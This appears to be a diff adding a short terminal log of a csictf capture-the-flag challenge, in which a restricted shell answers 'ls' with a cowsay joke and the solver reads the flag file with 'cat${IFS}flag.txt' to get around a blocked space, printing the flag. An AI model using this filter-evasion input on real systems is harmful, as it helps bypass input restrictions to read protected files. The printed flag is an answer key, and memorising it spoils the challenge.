@@ -1,0 +1,18 @@
+user @ csictf: $ 
+ls
+ ________________________________________
+/ Don't look at me, I'm just here to say \
+\ moo.                                   /
+ ----------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+user @ csictf: $ 
+dir
+flag.txt  script.sh  start.sh
+user @ csictf: $ 
+cat${IFS}flag.txt
+csictf{1_4m_cl4rk3_k3nt}
+user @ csictf: $ 
